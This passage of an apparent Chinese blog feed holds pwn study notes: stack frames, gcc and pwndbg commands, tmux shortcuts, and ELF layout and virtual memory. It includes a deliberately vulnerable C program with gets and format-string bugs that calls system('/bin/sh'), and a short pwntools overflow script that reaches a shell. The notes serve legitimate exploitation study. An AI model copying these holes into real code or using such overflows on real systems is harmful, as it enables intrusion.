ebp,esp</span><br></pre></td></tr></table></figure><p>就会使我们的bin_sh_addr变成返回地址</p><p>如果，我们向这中间再加一个值，就可以使用bin_sh_addr作为参数了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call func</span><br></pre></td></tr></table></figure><p>也就相当于 push eip</p><p>这样，就自然而然在ebp和bin_sh_addr之间加了一个地址，就可以使bin_sh_addr作为一个参数了</p><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230203194748.png" alt=""></p><p>过程的话长这样</p><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230203200043.png" alt=""></p><blockquote><p>ebp只变了两次，分别在2，3变了</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gcc,pwndbg,tmux的一些基本命令</title>
      <link href="/2023/01/22/gcc-pwndbg-tmux%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/"/>
      <url>/2023/01/22/gcc-pwndbg-tmux%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><h1 id="gcc的一些基本命令">gcc的一些基本命令</h1><h2 id="gcc-test-c">gcc test.c</h2><p>将test.c预处理、汇编、编译并链接形成可执行文件。这里未指定输出文件，默认输出为a.out。</p><h2 id="gcc-test-c-o-name">gcc test.c -o &lt;name&gt;</h2><p>将test.c预处理、汇编、编译并链接形成可执行文件test（文件名为test，&lt;name&gt;=‘test’）。-o选项用来指定输出文件的文件名。(该命令中o为小写英文字母o)</p><h2 id="gcc-test-c-o3">gcc test.c -O3</h2><p>使用编译优化级别1编译程序。级别为1~3(-O1,-O2,-O3)，级别越大优化效果越好，但编译时间越长。（该命令中O为大写英文字母O）</p><p>输出文件的文件名默认为a.out，可以结合-o &lt;name&gt;输出自己想要的文件名。</p><p>级别越高gcc会自动删除一些无用（不可能发生的代码）</p><h2 id="使用gcc编译的过程">使用gcc编译的过程</h2><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/755863d39bfa155b10f0d7a245bd4987.png" alt="755863d39bfa155b10f0d7a245bd4987"></p><p>前面的指令都是直接一步到位，直接形成可执行程序。根据这个编译过程，gcc提供了另一些命令选项来一步一步进行这些过程：</p><h3 id="gcc-e-test-c-o-test-i">gcc -E test.c -o test.i</h3><p>将test.c文件预处理生成名为test.i的文件（此时还不可以执行）。此过程中预处理器执行宏替换、条件编译以及包含指定的文件(include xxx)。</p><h3 id="gcc-s-test-i">gcc -S test.i</h3><p>汇编文件，生成test.s，由预处理得到的源代码文件，进行机器翻译产出。（可以用‘cat test.s |less’命令试着去读读，反正做题都是可执行文件反汇编，汇编一定要会看（俺尽量在看懂））</p><h3 id="gcc-c-test-s">gcc -c test.s</h3><p>将汇编输出文件test.s编译输出test.o文件。&lt;name&gt;.o文件：可重定位目标文件（机器码文件），由汇编文件经过汇编操作生成，该文件不可直接执行。</p><h3 id="gcc-test-o">gcc test.o</h3><p>将编译输出文件test.o链接成最终可执行文件默认a.out（可以用-o来指定输出名字）。&lt;name&gt;(xxx.out)二进制可执行目标文件（也是一个目标文件），由机器码文件进一步链接生成。这一步中，各种符号引用和符号定义转换成为可执行文件中的合适信息，通常是虚拟地址。</p><h2 id="补充">补充</h2><p><font size='5'>同一段代码不同版本的gcc所编译出来的可执行文件不一定相同</font></p><p>以下面一段代码为例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//file name = question.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> sh[]=<span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">init_func</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">(<span class="type">char</span> *cmd)</span>&#123;</span><br><span class="line">system(cmd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> a[<span class="number">8</span>] = &#123;&#125;;</span><br><span class="line">    <span class="type">char</span> b[<span class="number">8</span>] = &#123;&#125;;</span><br><span class="line">    <span class="comment">//char a[1] = &#123;&#x27;b&#x27;&#125;;</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;input:&quot;</span>);</span><br><span class="line">gets(a);  </span><br><span class="line"><span class="built_in">printf</span>(a);</span><br><span class="line"><span class="keyword">if</span>(b[<span class="number">0</span>]==<span class="string">&#x27;a&#x27;</span>)&#123; </span><br><span class="line">func(sh);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用gcc-5.4.0编译question.c</p><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/QQ%E5%9B%BE%E7%89%8720230122213653.png" alt="QQ图片20230122213653"></p><p>所生成的可执行文件经IDA Pro处理后的伪C代码如图：</p><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/QQ%E6%88%AA%E5%9B%BE20230122214846.png" alt="QQ截图20230122214846"></p><p>可以看到变量format和v5在内存中相差<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mi>x</mi><mn>20</mn><mo>−</mo><mn>0</mn><mi>x</mi><mn>10</mn><mo>=</mo><mn>0</mn><mi>x</mi><mn>10</mn><mo stretchy="false">(</mo><mi>D</mi><mi>e</mi><mi>c</mi><mi>i</mi><mi>m</mi><mi>a</mi><mi>l</mi><mo>:</mo><mn>16</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">0x20-0x10=0x10(Decimal:16)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">0</span><span class="mord mathnormal">x</span><span class="mord">20</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span><span class="mord mathnormal">x</span><span class="mord">10</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mord mathnormal">x</span><span class="mord">10</span><span class="mopen">(</span><span class="mord mathnormal">Dec</span><span class="mord mathnormal">ima</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">16</span><span class="mclose">)</span></span></span></span>个字节此题该种编译方式最粗暴的的脚本为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p =process(<span class="string">&quot;./gcc-5.4.0&quot;</span>)  </span><br><span class="line"><span class="comment">#file name=gcc-5.4.0</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x11</span></span><br><span class="line"><span class="comment">#多一个字符&#x27;a&#x27;,覆盖v5为a</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>而当用gcc-12.2.0编译该代码</p><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/QQ%E6%88%AA%E5%9B%BE20230122221127.png" alt="QQ截图20230122221127"></p><p>将产生的gcc-12.2.0文件经过IDA Pro处理,产生的伪C代码乍一看根本没有v5这一个变量：</p><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/QQ%E6%88%AA%E5%9B%BE20230122221850.png" alt="QQ截图20230122221850"></p><p>但是打开gdb，发现反汇编中仍然存在另一个变量的第一个字节与0x61进行比较：</p><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/QQ%E6%88%AA%E5%9B%BE20230122222435.png" alt="QQ截图20230122222435"></p><p>但是发现，我们进行比较的变量在rbp-0x10，但是需要我们输入的变量地址在rbp-0x8</p><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/rbp1.png" alt="rbp1"></p><p>根据这张图（如果俺画的没有错的话），单纯靠输入多少个‘a’都不可能覆盖到rbp-0x10，从而获取到shell</p><h1 id="gdb-使用pwndbg-的一些基本命令">gdb（使用pwndbg）的一些基本命令</h1><blockquote><p>参考链接：<a href="https://blog.csdn.net/Breeze_CAT/article/details/103789233">https://blog.csdn.net/Breeze_CAT/article/details/103789233</a></p></blockquote><h2 id="i-info">i (info)</h2><h3 id="i-r">i r</h3><p>info registers 查看各个寄存器当前的值</p><p>例：</p><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/QQ%E6%88%AA%E5%9B%BE20230123120605.png" alt="QQ截图20230123120605"></p><h3 id="i-b">i b</h3><p>info breakpoints 查看各个断点的信息</p><p>例：</p><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/QQ%E6%88%AA%E5%9B%BE20230123120712.png" alt="QQ截图20230123120712"></p><h3 id="i-func">i func</h3><p>info func 查看各个函数的信息(一般会超级超级多，建议直接用IDA Pro代替这个指令，就不放图了)</p><h2 id="show">show</h2><p>how //和info类似，但是查看调试器的基本信息，如：</p><blockquote><p>show args //查看参数</p></blockquote><h2 id="backtrace">backtrace</h2><p>查看调用栈</p><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/QQ%E6%88%AA%E5%9B%BE20230123123821.png" alt="QQ截图20230123123821"></p><h2 id="q">q</h2><p>退出gdb，没啥好说的（quit）</p><h2 id="s-si">s/si</h2><p>s 单步步入，遇到调用跟进函数中，相当于step into，源码层面的一步</p><p>si 同s，汇编层面的一步</p><h2 id="fin">fin</h2><p>finish 跳出当前函数，当用s/si误入一个函数时，可以用这个指令跳出该函数（例如误用s/si进入gets函数，输入fin即可以返回main函数，假设由main函数进入gets函数）</p><h2 id="n-ni">n/ni</h2><p>n 单步步过，遇到调用不跟进，相当于step over，源码层面的一步</p><p>ni 同n汇编层面的一步</p><h2 id="c">c</h2><ul><li>c continue，继续执行到断点，没断点就一直执行下去</li></ul><h2 id="b-常">b（常）</h2><ul><li><p>b*(0x123456) //给0x123456地址处的指令下断点</p></li><li><p>b *$ rebase(0x123456) //$rebase 在调试开PIE的程序的时候可以直接加上程序的随机地址</p></li><li><p>b fun_name //给函数fun_name下断点，目标文件要保留符号才行</p><ul><li>b file_name:fun_name</li></ul></li><li><p>b file_name:15 //给file_name的15行下断点，要有源码才行</p><ul><li>b 15</li></ul></li><li><p>b +0x10 //在程序当前停住的位置下0x10的位置下断点，同样可以-0x10，就是前0x10</p></li><li><p>break fun if $rdi==5 //条件断点，rdi值为5的时候才断</p></li></ul><h2 id="删除-禁用断点">删除/禁用断点</h2><ul><li><p>使用info break(简写: i b)来查看断点编号</p></li><li><p>delete 5 //删除5号断点，直接delete不接数字删除所有</p></li><li><p>disable 5 //禁用5号断点</p></li><li><p>enable 5 //启用5号断点</p></li><li><p>clear //清除下面的所有断点</p></li></ul><h2 id="x-常">x（常）</h2><p>查看内存指令x：<br>x /nuf 0x123456 //常用，x指令的格式是：x空格/nfu，nfu代表三个参数</p><ul><li><p>n代表显示几个单元（而不是显示几个字节，后面的u表示一个单元多少个字节），放在’/'后面</p></li><li><p>u代表一个单元几个字节，b(一个字节)，h(俩字节)，w(四字节)，g(八字节),或者直接使用十进制数字代表几个字节</p></li><li><p>f代表显示数据的格式，f和u的顺序可以互换，也可以只有一个或者不带n，用的时候很灵活</p><blockquote><p>x 按十六进制格式显示变量。<br>d 按十进制格式显示变量。<br>u 按十六进制格式显示无符号整型。<br>o 按八进制格式显示变量。<br>t 按二进制格式显示变量。<br>a 按十六进制格式显示变量。<br>c 按字符格式显示变量。<br>f 按浮点数格式显示变量。<br>s 按字符串显示。<br>b 按字符显示。<br>i 显示汇编指令。</p></blockquote><p>例如：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x /10gx 0x123456 //从0x123456开始每个单元八个字节，十六进制显示是个单元的数据</span><br><span class="line">x /10xd $rdi //从rdi指向的地址向后打印10个单元，每个单元4字节的十进制数</span><br><span class="line">x /10i 0x123456 //从0x123456处向后显示十条汇编指令</span><br></pre></td></tr></table></figure><h2 id="p-常">p(常)</h2><ul><li>p fun_name //打印fun_name的地址，需要保留符号</li><li>p 0x10-0x08 //计算0x10-0x08的结果</li><li>p &amp;a //查看变量a的地址</li><li>p *(0x123456) //查看0x123456地址的值，注意和x指令的区别，x指令查看地址的值不用星号</li><li>p $rdi //显示rdi寄存器的值，注意和x的区别，这只是显示rdi的值，而不是rdi指向的值<ul><li>p *($rdi) //显示rdi指向的值</li></ul></li></ul><h2 id="disass-常">disass（常）</h2><p>反汇编指令</p><ul><li>disass 0x123456 //显示0x123456前后的汇编指令</li><li>disass $rip //显示rip指向的地址后的汇编指令</li><li>disass func_name //显示func_name后的汇编指令<ul><li>disass main：</li><li><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/QQ%E6%88%AA%E5%9B%BE20230123132356.png" alt="QQ截图20230123132356"></li></ul></li></ul><h2 id="set">set</h2><ul><li>set $rdi=0x10 //把rdi寄存器的值变为0x10</li><li>set *(0x123456)=0x10 //0x123456地址的值变为0x10，注意带星号</li><li>set args “abc” “def” “gh“//给参数123赋值</li><li>set args “python -c ‘print “1234\x7f\xde”’” //使用python给参数赋值不可见字符</li></ul><h2 id="cyclic-num">cyclic &lt;num&gt;</h2><p>生成指定数目的溢出字符串</p><h2 id="查找">查找</h2><ul><li>search rdi //从当前位置向后查包含rdi的指令，返回若干</li><li>search -h //查看search帮助，我也不太长用这个指令</li><li>find “hello” //查找hello字符串</li><li>ropgadget //查找ropgadget</li></ul><h1 id="tmux的一些基本指令-分屏调试">tmux的一些基本指令（分屏调试）</h1><blockquote><p>参考链接：<a href="https://blog.csdn.net/qq_38156104/article/details/125093656">https://blog.csdn.net/qq_38156104/article/details/125093656</a></p></blockquote><p>使用tmux应该先在终端输入tmux</p><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/QQ%E6%88%AA%E5%9B%BE20230123133843.png" alt="QQ截图20230123133843"></p><p>该命令会启动 Tmux 窗口，底部有一个状态栏。状态栏的左侧是窗口信息（编号和名称），右侧是系统信息。</p><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/QQ%E6%88%AA%E5%9B%BE20230123133958.png" alt="QQ截图20230123133958"></p><p>按下<code>Ctrl+d</code>或者显式输入<code>exit</code>命令，就可以退出 Tmux 窗口。</p><blockquote><p>$ exit</p></blockquote><h2 id="前缀键">前缀键</h2><p>Tmux 窗口有大量的快捷键。所有快捷键都要通过前缀键唤起。默认的前缀键是Ctrl+b，即先按下Ctrl+b，快捷键才会生效。</p><p>举例来说，帮助命令的快捷键是Ctrl+b ?。它的用法是，在 Tmux 窗口中，先按下Ctrl+b，再按下?，就会显示帮助信息。然后，按下 ESC 键或q键，就可以退出帮助。</p><h2 id="窗格管理快捷键">窗格管理快捷键</h2><blockquote><p>Ctrl+b %：划分左右两个窗格。<br>Ctrl+b &quot;：划分上下两个窗格。<br>Ctrl+b <arrow key>：光标切换到其他窗格。<arrow key>是指向要切换到的窗格的方向键，比如切换到下方窗格，就按方向键↓。<br>Ctrl+b ;：光标切换到上一个窗格。<br>Ctrl+b o：光标切换到下一个窗格。<br>Ctrl+b {：当前窗格与上一个窗格交换位置。<br>Ctrl+b }：当前窗格与下一个窗格交换位置。<br>Ctrl+b Ctrl+o：所有窗格向前移动一个位置，第一个窗格变成最后一个窗格。<br>Ctrl+b Alt+o：所有窗格向后移动一个位置，最后一个窗格变成第一个窗格。<br>Ctrl+b x：关闭当前窗格。<br>Ctrl+b !：将当前窗格拆分为一个独立窗口。<br>Ctrl+b z：当前窗格全屏显示，再使用一次会变回原来大小。<br>Ctrl+b Ctrl+&lt;arrow key&gt;：按箭头方向调整窗格大小。<br>Ctrl+b q：显示窗格编号。</p></blockquote><h2 id="窗口快捷键">窗口快捷键</h2><blockquote><p>Ctrl+b c：创建一个新窗口，状态栏会显示多个窗口的信息。<br>Ctrl+b p：切换到上一个窗口（按照状态栏上的顺序）。<br>Ctrl+b n：切换到下一个窗口。<br>Ctrl+b &lt;number&gt;：切换到指定编号的窗口，其中的&lt;number&gt;是状态栏上的窗口编号。<br>Ctrl+b w：从列表中选择窗口。<br>Ctrl+b ,：窗口重命名。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn笔记(一)</title>
      <link href="/2023/01/05/pwn%E7%AC%94%E8%AE%B0-%E4%B8%80/"/>
      <url>/2023/01/05/pwn%E7%AC%94%E8%AE%B0-%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><blockquote><p>exploit：</p><blockquote><p>用于攻击的脚本与方案</p></blockquote></blockquote><blockquote><p>payload:</p><blockquote><p>攻击载荷，是让目的进程被劫持控制流的数据</p></blockquote></blockquote><blockquote><p>shellcode:</p><blockquote><p>调用攻击目标的shell的代码</p></blockquote></blockquote><h1 id="程序的编译与链接">程序的编译与链接</h1><h2 id="从c源代码到可执行文件的生成过程：">从C源代码到可执行文件的生成过程：</h2><ol><li><p>编译：<br>由C语言代码生成汇编代码</p></li><li><p>汇编：</p></li></ol><p>​    由汇编代码生成机器码</p><ol start="3"><li><p>链接</p><p>将多个机器码的目标文件链接成一个可执行的文件</p></li></ol><p>以下是用”gcc &lt;文件名&gt;”这个命令所发生的一系列过程:</p><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/QQ%E6%88%AA%E5%9B%BE20230103200525.png" alt=""></p><p>整个过程：</p><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/QQ%E6%88%AA%E5%9B%BE20230103200844.png" alt=""></p><h2 id="什么是可执行文件？">什么是可执行文件？</h2><p>一. 广义：文件中的数据是可执行代码的文件(只要能够运行)</p><p>​.out、.exe、.sh、.py</p><p>二. 狭义：文件中的数据是机器码的文件</p><p>​.out、.exe、.dll、.so</p><p>可执行文件的分类：</p><table><thead><tr><th></th><th>Windows: PE(Portable Executable)</th><th>Linux: ELF (Exexutable and Linkable Format)</th></tr></thead><tbody><tr><td>可执行程序</td><td>.exe</td><td>.out</td></tr><tr><td>动态链接库</td><td>.dll</td><td>.so</td></tr><tr><td>静态链接库</td><td>.lib</td><td>.a</td></tr></tbody></table><table><tr><td bgcolor=PowderBlue><label style="color:blue">"gcc <文件名>" 命令产生的文件目前存放在磁盘中，是ELF文件，当你打开后，该文件会加载到内存中（此时就不叫ELF）</label> </td></tr></table><h2 id="elf文件结构">ELF文件结构</h2><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/QQ%E6%88%AA%E5%9B%BE20230103204214.png" alt=""></p><p>ELF：</p><ul><li><p>header</p><ul><li>ELF header：记录整个ELF文件的整个结构分布</li><li>Program Header Table: 主要记录一些段的信息</li></ul></li><li><p>sections</p><ul><li>Code <s>后面会是Code段</s> ： 记录不同的机械码的分区，不同的分区有不同的功能，不同的功能被划分成不同的代码节（用户： .text节）</li><li>Data <s>同理后面会是Data段</s> ： 不能被执行，存放数据（got节:记录全局偏移量的地址,Dynamic节：存放动态链接的数据 ）</li><li>Sections’ names: 记录了各个节的节名（字典）</li></ul></li><li><p>Header</p><ul><li>Section Header Table: 包含了描述文件节区的信息，每个节区在表中都有一项，每一项给出诸如节区名称、节区大小这类信息。</li></ul></li></ul><blockquote><p>段：当程序加载到内存中成为进程的时候，进行读、写、执行、权限划分的一个视图</p><p>节：elf文件存放在磁盘中，进行不同功能区域划分的一个视图</p></blockquote><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/QQ%E6%88%AA%E5%9B%BE20230103212006.png" alt=""></p><h1 id="程序装载与虚拟内存">程序装载与虚拟内存</h1><table><tr><td bgcolor=PowderBlue><label style="color:blue">CPU访问的是主存中的数据</label> </td></tr></table><p>内存算是主存 磁盘是外存（断电任然可以保存数据）</p><p>程序执行时，要从磁盘中“拷贝”到内存中。变成VM（virtual memory）视图。从磁盘中的 程序文件变成内存中的一个进程对应的虚拟内存区域。</p><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/QQ%E6%88%AA%E5%9B%BE20230103214324.png" alt=""></p><p>Data段： 由具有读，写权限的节（.data、.bss、.got、.plt）转化</p><p>Code段（text段）： 由没有写的权限，只有读或者具有可读可执行的权限的节（.rodata（read only data）、.text、.init、ELF Header）转化</p><p>查看磁盘结构不仅可以使用IDA Pro，在Linux上，可以使用“objdump -s elf”指令查看。</p><h2 id="在linux下：使用-cat-proc-pid-maps-命令：">在Linux下：使用“cat /proc/pid/maps”命令：</h2><blockquote><p>原文链接：<a href="https://blog.csdn.net/unix21/article/details/8450042">https://blog.csdn.net/unix21/article/details/8450042</a></p></blockquote><p>proc/“进程PID”/maps<br>查看进程的虚拟地址空间是如何使用的。<br>该文件有6列，分别为：<br>地址：库在进程里地址范围<br>权限：虚拟内存的权限，r=读，w=写,x=,s=共享,p=私有；<br>偏移量：库在进程里地址范围<br>设备：映像文件的主设备号和次设备号；<br>节点：映像文件的节点号；<br>路径: 映像文件的路径<br>每项都与一个vm_area_struct结构成员对应</p><p>例如以下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> sh[]=<span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">init_func</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">(<span class="type">char</span> *cmd)</span>&#123;</span><br><span class="line">        system(cmd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> a[<span class="number">8</span>] = &#123;&#125;;</span><br><span class="line">    <span class="type">char</span> b[<span class="number">8</span>] = &#123;&#125;;</span><br><span class="line">    <span class="comment">//char a[1] = &#123;&#x27;b&#x27;&#125;;</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;input:&quot;</span>);</span><br><span class="line">        gets(a);</span><br><span class="line">        <span class="built_in">printf</span>(a);</span><br><span class="line">        <span class="keyword">if</span>(b[<span class="number">0</span>]==<span class="string">&#x27;a&#x27;</span>)&#123;</span><br><span class="line">                func(sh);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译成文件名为out的文件（gcc test.c -o out）</p><p>执行该文件 ./out</p><p>查看内存进程 <strong>ps au</strong></p><p>143就是我们需要的pid</p><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/QQ%E6%88%AA%E5%9B%BE20230110154845.png" alt="QQ截图20230110154845"></p><p>cat proc/143/maps:</p><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/QQ%E6%88%AA%E5%9B%BE20230110155144.png" alt="QQ截图20230110155144"></p><p>参数 解释<br>address: 0085d000-00872000 虚拟内存区域的起始和终止地址文件所占的地址空间<br>perms:rw-p 权限：r=read, w=write, x=execute, s=shared, p=private(copy on write)<br>offset: 00000000 虚拟内存区域在被映射文件中的偏移量<br>dev: 03:08 文件的主设备号和次设备号<br>inode: 设备的节点号，0表示没有节点与内存相对应<br>name: /lib/ld-2.31.so 被映射文件的文件名<br>各共享库的代码段，存放着二进制可执行的机器指令，是由kernel把该库ELF文件的代码段map到虚存空间；<br>各共享库的数据段，存放着程序执行所需的全局变量，是由kernel把ELF文件的数据段map到虚存空间；<br>用户代码段，存放着二进制形式的可执行的机器指令，是由kernel把ELF文件的代码段map到虚存空间；<br>用户数据段之上是代码段，存放着程序执行所需的全局变量，是由kernel把ELF文件的数据段map到虚存空间；<br>用户数据段之下是堆(heap)，当且仅当malloc调用时存在，是由kernel把匿名内存map到虚存空间，堆则在程序中没有调用malloc的情况下不存在；<br>用户数据段之下是栈(stack)，作为进程的临时数据区，是由kernel把匿名内存map到虚存空间，栈空间的增长方向是从高地址到低地址。</p><p><strong><font size='10'>体现了Linux一切皆文件的说法</font></strong></p><h2 id="补充基础知识">补充基础知识</h2><p><font size='5'>地址以字节编码</font></p><p>1Byte =8bit</p><p><font size="5">常以16进制表示</font></p><p>0x3c=0011 1100</p><p><font size='4'>虚拟内存<font color="red">用户空间</font>每个进程一份</font></p><p><font size='4'>虚拟内存<font color='red'>内核空间</font>所有进程共享一份</font></p><p><font size='4'>虚拟内存mmap段中的<font color='red'>动态链接库</font>仅在物理内存中装载一份</font></p><p><font size='4'>把高位想象成低地址，低位想象成高地址，像这样：</font></p><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/QQ%E6%88%AA%E5%9B%BE20230114153743.png" alt="QQ截图20230114153743"></p><h1 id="cpu与进程的执行">CPU与进程的执行</h1><h2 id="段和节的具体划分">段和节的具体划分</h2><p><img 